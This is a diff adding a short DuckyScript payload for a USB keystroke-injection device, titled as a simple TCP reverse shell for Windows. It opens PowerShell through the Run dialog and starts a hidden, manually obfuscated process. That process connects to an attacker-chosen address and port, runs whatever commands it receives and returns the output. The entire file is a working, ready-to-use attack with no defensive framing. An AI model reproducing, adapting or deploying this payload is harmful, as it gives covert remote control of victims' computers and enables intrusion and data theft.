@@ -1,0 +1,37 @@
+REM Title: Simple tcp sock reverse shell
+REM Author: bytequill
+REM Description: Template based on https://github.com/t3l3machus/Villain/blob/main/Core/payload_templates/windows/netcat/powershell_reverse_tcp_v2.py
+REM Target: Windows powershell
+ATTACKMODE HID
+REM format: IP  eg. 0.0.0.0 192.168.1.1
+DEFINE #ADDR 
+DEFINE #PORT 
+
+DELAY 1000
+GUI r
+DELAY 200
+STRINGLN powershell
+DELAY 600
+
+REM Manually obfuscated payload. 
+STRING_POWERSHELL
+S""tar''t-Pr''oc""es''s $PSHOME\powershell.exe -ArgumentList {
+    $c=N""ew-Obje''ct Net.Sockets.TCPClient('#ADDR', #PORT);
+    $i=$c.GetStream();
+    $Q=Ne''w-Ob''je""ct IO.StreamWriter($i);
+    function send($h){
+        [byte[]]$script:Buffer = 0..$c.ReceiveBufferSize|%{0};$Q.Write($h);
+        $Q.Flush()
+    }
+    $B = new-object System.Byte[] 4096;
+    while (($n = $i.Read($B, 0, $B.Length)) -gt 0) {
+        $x = ([text.encoding]::UTF8).GetString($B, 0, $n - 1);
+        $k = try {Inv''ok""e-E''xpress''ion $x 2>&1 | O''ut-Str""ing} catch {$_ | O''ut-St""rin''g};
+        send($k)
+    }
+    $Q.Close()
+} -WindowStyle Hidden;
+exit
+END_STRING
+ENTER
+ATTACKMODE OFF
